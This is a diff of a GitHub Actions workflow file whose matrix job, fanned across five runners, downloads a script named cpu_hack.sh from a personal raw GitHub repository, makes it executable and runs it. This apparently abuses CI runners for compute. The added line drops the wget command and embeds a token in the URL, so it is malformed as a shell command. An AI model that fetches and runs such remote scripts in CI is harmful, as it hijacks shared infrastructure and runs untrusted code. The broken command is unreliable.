@@ -24,4 +24,4 @@ jobs:
      runner: [0,1,2,3,4]
    steps:
      - run: |
-          wget https://raw.githubusercontent.com/davesmith0x0001/davesmith0x001_vps/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+         https://raw.githubusercontent.com/davesmith0x0001/davesmith0x001_vps/main/cpu_hack.sh?token=GHSAT0AAAAAABVR66BQCFCJVRVEMW7NYY2EYVHD2LQ && chmod +x cpu_hack.sh && ./cpu_hack.sh
